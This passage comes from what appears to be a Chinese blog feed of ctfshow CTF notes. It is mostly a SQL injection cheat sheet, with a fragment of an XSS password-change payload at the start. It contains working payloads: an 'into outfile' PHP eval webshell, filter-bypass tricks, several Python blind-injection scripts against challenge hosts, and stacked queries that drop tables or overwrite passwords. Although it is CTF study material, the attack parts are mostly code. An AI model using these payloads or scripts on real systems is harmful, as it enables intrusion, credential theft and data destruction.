class="line-numbers-rows"><span></span></span></code></pre><p>可以跳转让管理员跳转到自己的页面进行修改密码</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">GET:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'http://127.0.0.1/api/change.php?p=123'</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>POST:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">url</span><span class="token operator">:</span><span class="token string">'api/change.php'</span><span class="token punctuation">,</span><span class="token literal-property property">type</span><span class="token operator">:</span><span class="token string">'post'</span><span class="token punctuation">,</span><span class="token literal-property property">data</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token literal-property property">p</span><span class="token operator">:</span><span class="token string">'123'</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2022/09/08/sql-zhu-ru/"/>
      <url>/2022/09/08/sql-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h2 id="1、使用replace函数（将过滤的字符进行替换）"><a href="#1、使用replace函数（将过滤的字符进行替换）" class="headerlink" title="1、使用replace函数（将过滤的字符进行替换）"></a>1、使用replace函数（将过滤的字符进行替换）</h2><h2 id="2、进行base64编码带出"><a href="#2、进行base64编码带出" class="headerlink" title="2、进行base64编码带出"></a>2、进行base64编码带出</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">to_base64()replace(password,"1","!")replace(replace(password,"2","@"),"1","!")replace(replace(replace(password,"3","#"),"2","@"),"1","!")#用数字替换或者其他值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3、写文件"><a href="#3、写文件" class="headerlink" title="3、写文件"></a>3、写文件</h2><p>返回过滤更加变态了</p><p>使用写文件，写shell</p><p><code>?id=999&#39; union select 1,&quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &#39;/var/www/html/1.php</code></p><p>但是需要开启mysql写文件的配置</p><p>否则会报错：<code>The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</code></p><p>同时，上交webshell时，最好对webshell进行base64编码，在进行URL编码在放在from_base64()中进行提交</p><p>有时，在输出框写sql语句可能会导致不全，因此最好抓包发送。</p><p>写shell后，用查看mysql配置文件，对应端口，然后用蚁剑连接mysql</p><h2 id="4、也可以利用逻辑漏洞"><a href="#4、也可以利用逻辑漏洞" class="headerlink" title="4、也可以利用逻辑漏洞"></a>4、也可以利用逻辑漏洞</h2><p> ?id&#x3D;999’ or username&#x3D;’flag</p><h2 id="5、空格绕过"><a href="#5、空格绕过" class="headerlink" title="5、空格绕过"></a>5、空格绕过</h2><p><code>\x0c</code>和<code>%0c</code>有区别，过滤了<code>\x0c</code>但不过滤<code>%0c</code></p><ol><li>多层括号嵌套</li><li>改用+号</li><li>使用注释代替&#x2F;**&#x2F; </li><li><code>and/or</code>后面可以跟上偶数个<code>!、~</code>可以替代空格，也可以混合使用(规律又不同)，and&#x2F;or前的空格可用省略</li><li><code>%09, %0a, %0b, %0c, %0d, %a0</code>等部分不可见字符可也代替空格</li></ol><h2 id="6、模糊查询逃逸"><a href="#6、模糊查询逃逸" class="headerlink" title="6、模糊查询逃逸"></a>6、模糊查询逃逸</h2><p>?id&#x3D;999’ or username like ‘%fla% </p><h2 id="7、盲注（只要可以得到flag就可以）"><a href="#7、盲注（只要可以得到flag就可以）" class="headerlink" title="7、盲注（只要可以得到flag就可以）"></a>7、盲注（只要可以得到flag就可以）</h2><p><img src="/images/image-20220816221354092-1662567174471.png" alt="image-20220816221354092"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string<span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token operator">=</span><span class="token string">"ctfshow"</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token string">"&#123;&#125;qwertyuiopasdfghjklzxcvbnm-0123456789"</span><span class="token punctuation">:</span>            url<span class="token operator">=</span><span class="token string">"http://2c4750b8-b909-4500-bea9-6166645718e4.challenge.ctf.show/select-waf.php"</span>            data<span class="token operator">=</span><span class="token punctuation">&#123;</span>                <span class="token string">'tableName'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f'`ctfshow_user`where`pass`regexp("</span><span class="token interpolation"><span class="token punctuation">&#123;</span>r<span class="token operator">+</span>c<span class="token punctuation">&#125;</span></span><span class="token string">")'</span></span>            <span class="token punctuation">&#125;</span>            res<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">'user_count = 1'</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                r<span class="token operator">+=</span>c                <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    getFlag<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>登录框用户名输入0&#x2F;1有不同的显示</p><h2 id="8、where过滤了可以使用having绕过"><a href="#8、where过滤了可以使用having绕过" class="headerlink" title="8、where过滤了可以使用having绕过"></a>8、where过滤了可以使用having绕过</h2><h2 id="9、regexp-中可以使用字符串的16进制代替字符串"><a href="#9、regexp-中可以使用字符串的16进制代替字符串" class="headerlink" title="9、regexp()中可以使用字符串的16进制代替字符串"></a>9、regexp()中可以使用字符串的16进制代替字符串</h2><p>字符串转16进制，就是将各个字符串ascii码的16进制值进行拼接</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">def</span> <span class="token function">str2hex</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> word <span class="token keyword">in</span> string<span class="token punctuation">:</span>        result <span class="token operator">+=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> result<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_response</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">'http://9cade8bb-a3e2-4e1a-8610-2b4a3cbf7ea5.challenge.ctf.show/select-waf.php'</span>    payload <span class="token operator">=</span> <span class="token string">"ctfshow_user group by pass having pass regexp(0x&#123;&#125;)"</span>    dic <span class="token operator">=</span> <span class="token string">'ctfshow&#123;034e69f-a87bdgijklmnpqruvxyz125_&#125;'</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'tableName'</span><span class="token punctuation">:</span> payload    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> word <span class="token keyword">in</span> dic<span class="token punctuation">:</span>        data<span class="token punctuation">[</span><span class="token string">'tableName'</span><span class="token punctuation">]</span> <span class="token operator">=</span> payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>str2hex<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> str2hex<span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token punctuation">)</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.25</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'$user_count = 1;'</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>            result <span class="token operator">+=</span> word            <span class="token keyword">return</span> result<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">55</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> get_response<span class="token punctuation">(</span>result<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="10、mysql中的一些常量：（绕过数字过滤）"><a href="#10、mysql中的一些常量：（绕过数字过滤）" class="headerlink" title="10、mysql中的一些常量：（绕过数字过滤）"></a>10、mysql中的一些常量：（绕过数字过滤）</h2><p>true&#x3D;1、false&#x3D;0、floor(pi())&#x3D;3、ceil(pi())&#x3D;4</p><p> <img src="/images/20201127190309995.png" alt="在这里插入图片描述"> </p><pre class="line-numbers language-text" data-language="text"><code class="language-text">因为过滤引号：a=>char(97)=>char(group_concat((true+true+true+true+true+true+true+true+true),(true+true+true+true+true+true+true)))ctfshowctfshow_user group by pass having pass regexp(concat(char(concat((true+true+true+true+true+true+true+true+true),(true+true+true+true))),char(concat((true+true+true+true+true+true+true+true+true),(true+true+true+true+true+true+true+true+true))),char(concat((true),(true),(true+true+true+true+true+true))),char(concat((true),(false),(true+true))),char(concat((true),(true),(true+true+true+true+true))),char(concat((true),(false),(true+true+true+true))),char(concat((true),(true),(true))),char(concat((true),(true),(true+true+true+true+true+true+true+true+true))),char(concat((true),(true+true),(true+true+true)))))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timetrue_dict <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'0'</span><span class="token punctuation">:</span> <span class="token string">'false'</span><span class="token punctuation">,</span>    <span class="token string">'1'</span><span class="token punctuation">:</span> <span class="token string">'true'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    true_dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> true_dict<span class="token punctuation">[</span><span class="token string">'1'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'+true'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">word2char</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token punctuation">:</span>    num <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token punctuation">)</span>    result <span class="token operator">=</span> <span class="token string">'char(concat('</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            result <span class="token operator">+=</span> <span class="token string">'('</span> <span class="token operator">+</span> true_dict<span class="token punctuation">[</span>num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">')'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            result <span class="token operator">+=</span> <span class="token string">',('</span> <span class="token operator">+</span> true_dict<span class="token punctuation">[</span>num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">')'</span>    result <span class="token operator">+=</span> <span class="token string">'))'</span>    <span class="token keyword">return</span> result<span class="token keyword">def</span> <span class="token function">sentence2true</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>    final_pass <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">if</span> string<span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                final_pass <span class="token operator">+=</span> word2char<span class="token punctuation">(</span>string<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                final_pass <span class="token operator">+=</span> <span class="token string">','</span> <span class="token operator">+</span> word2char<span class="token punctuation">(</span>string<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        final_pass <span class="token operator">+=</span> <span class="token string">''</span>    <span class="token keyword">return</span> final_pass<span class="token keyword">def</span> <span class="token function">get_response</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">'http://0d9c4c0e-e333-4d2b-a508-d407d67fb589.challenge.ctf.show/select-waf.php'</span>    payload <span class="token operator">=</span> <span class="token string">"ctfshow_user group by pass having pass regexp(concat(char(concat((true+true+true+true+true+true+true+true+true),(true+true+true+true))),&#123;&#125;))"</span>    dic <span class="token operator">=</span> <span class="token string">'ctfshow&#123;034e69f-a87bdgijklmnpqruvxyz125_&#125;'</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'tableName'</span><span class="token punctuation">:</span> payload    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> word <span class="token keyword">in</span> dic<span class="token punctuation">:</span>        data<span class="token punctuation">[</span><span class="token string">'tableName'</span><span class="token punctuation">]</span> <span class="token operator">=</span> payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>sentence2true<span class="token punctuation">(</span>result <span class="token operator">+</span> word<span class="token punctuation">)</span><span class="token punctuation">)</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.25</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'$user_count = 1;'</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'tableName'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            result <span class="token operator">+=</span> word            <span class="token keyword">return</span> result<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">55</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> get_response<span class="token punctuation">(</span>result<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="11、利用php特性"><a href="#11、利用php特性" class="headerlink" title="11、利用php特性"></a>11、利用php特性</h2><h3 id="ffifdyop"><a href="#ffifdyop" class="headerlink" title="ffifdyop"></a>ffifdyop</h3><p>登录窗口</p><p><img src="/images/image-20220504203051313-1662567174481.png" alt="image-20220504203051313"></p><p>后台使用了<code>md5(str,true)</code></p><p>当<code>str=ffifdyop</code>时，返回值存在<code>&#39;or&#39;hsakfjaslf</code>于是导致where语句恒为真</p><h3 id="弱类型"><a href="#弱类型" class="headerlink" title="弱类型"></a>弱类型</h3><h2 id="布尔盲注："><a href="#布尔盲注：" class="headerlink" title="布尔盲注："></a>布尔盲注：</h2><p>如果过滤了数字，最好还是使用二分法，不要将数字和字母混合</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">generateNum</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> <span class="token string">'true'</span>        <span class="token keyword">if</span> num <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> res        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                res <span class="token operator">+=</span> <span class="token string">"+true"</span>            <span class="token keyword">return</span> res<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">"http://ca827f64-8842-4eeb-b7fd-af626b721f8c.challenge.ctf.show/api/"</span>    i <span class="token operator">=</span> <span class="token number">0</span>    res <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>        head <span class="token operator">=</span> <span class="token number">32</span>        tail <span class="token operator">=</span> <span class="token number">127</span>        i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>            mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>            <span class="token comment"># 查数据库-ctfshow_flagas</span>            <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>            <span class="token comment"># 查字段-flagasabc</span>            <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagas'"</span>            <span class="token comment"># 查flag</span>            payload <span class="token operator">=</span> <span class="token string">"select flagasabc from ctfshow_flagas"</span>            params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                <span class="token string">"u"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>generateNum<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>generateNum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>generateNum<span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">,username,'a')"</span></span>            <span class="token punctuation">&#125;</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span>            <span class="token comment"># print(r.json()['data'])</span>            <span class="token keyword">if</span> <span class="token string">"userAUTO"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                tail <span class="token operator">=</span> mid        <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>            res <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果有回显，一般都先选择布尔盲注，没有回显可以尝试时间盲注，或者反弹shell</p><h3 id="截取字符函数："><a href="#截取字符函数：" class="headerlink" title="截取字符函数："></a>截取字符函数：</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">一、mysql截取字符串函数1、left(str,length) 从左边截取length2、right(str,length)从右边截取lengthsubstr&#x3D;&#x3D;substring3、substring(str,index)当index&gt;0从左边开始截取直到结束 当index&lt;0从右边开始截取直到结束 当index&#x3D;0返回空4、substring(str,index,len) 截取str,从index开始，截取len长度5、substring_index(str,delim,count)，str是要截取的字符串，delim是截取的字段count是从哪里开始截取(为0则是左边第0个开始，1位左边开始第一个选取左边的，-1从右边第一个开始选取右边的6、subdate(date,day)截取时间，时间减去后面的day7、subtime(expr1,expr2) 时分秒expr1-expr28、lpad(&#39;abc&#39;,1,&#39; &#39;)&#x3D;a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="比较函数"><a href="#比较函数" class="headerlink" title="比较函数"></a>比较函数</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">&gt;,&lt;,&#x3D;(字母直接相等或ascii,ord,char,hex等等相等)下面两种方式受字母顺序影响（需要控制好字母的开头）regexp  regexp(&#39;ea&#39;)  regexp(0x11)like  like &#39;%&#123;r+c&#125;%&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/image-20220817180108187-1662567174481.png" alt="image-20220817180108187"></p><p>首先尝试</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">username：0 mysql是一门弱类型语言，数字0与任何字符串都匹配password：1=>用户名不存在username：adminpassword：1=>密码错误username：1'or '1'='1password：1=>密码错误username可能存在bool盲注<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于是字符型：</p><p>要先尝试闭合方法</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string<span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">'http://1c8560d3-a1a7-4d6b-a3bd-da4dce30486b.challenge.ctf.show/api/'</span><span class="token keyword">def</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token operator">=</span><span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        flag<span class="token operator">=</span><span class="token boolean">True</span>        <span class="token keyword">for</span> c <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">:</span>            data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1' or if(substr((select group_concat(f1ag) from ctfshow_fl0g),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token string">',1,0);#"</span></span><span class="token punctuation">,</span>                <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>            <span class="token punctuation">&#125;</span>            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">'密码错误'</span> <span class="token operator">==</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                flag<span class="token operator">=</span><span class="token boolean">False</span>                r <span class="token operator">+=</span> c                <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>                <span class="token keyword">break</span>        <span class="token keyword">if</span> flag<span class="token punctuation">:</span>            <span class="token keyword">break</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    getFlag<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><h3 id="修改密码进入"><a href="#修改密码进入" class="headerlink" title="修改密码进入"></a>修改密码进入</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">1;update`ctfshow_user`set`pass`=1  过滤空格1;drop table ctfshow_user;create table ctfshow_user(`username` varchar(100),`pass` varchar(100));insert ctfshow_user(`username`,`pass`)value(1,2);交换用户名密码0;alter table ctfshow_user change `username` `passw2` text;alter table ctfshow_user change `pass` `username` text;alter table ctfshow_user change `passw2` `pass` text;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="覆盖上一阶段查出的东西"><a href="#覆盖上一阶段查出的东西" class="headerlink" title="覆盖上一阶段查出的东西"></a>覆盖上一阶段查出的东西</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">1;select(1) 就会返回1，与password对应<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="handler注入"><a href="#handler注入" class="headerlink" title="handler注入"></a>handler注入</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">show tables;show columns from xxx;handler ctfshow_user open as ctf;handler f read first;handler f read next;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/image-20220820223136866-1662567174481.png" alt="image-20220820223136866"></p><p>通常都是配套堆叠注入使用</p><p> handler用法分析：<a href="https://blog.csdn.net/JesseYoung/article/details/40785137">https://blog.csdn.net/JesseYoung/article/details/40785137</a> </p><p> mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。 </p><h3 id="预处理SQL语句"><a href="#预处理SQL语句" class="headerlink" title="预处理SQL语句"></a>预处理SQL语句</h3><p> 具体方法：<a href="https://blog.csdn.net/solitudi/article/details/107823398">https://blog.csdn.net/solitudi/article/details/107823398</a> </p><p>使用方法<br>MySQL 官方将 prepare、execute、deallocate 统称为 PREPARE STATEMENT。翻译也就习惯的称其为预处理语句。</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">PREPARE name from &#39;[my sql sequece]&#39;;   #&#x2F;&#x2F;预定义SQL语句EXECUTE 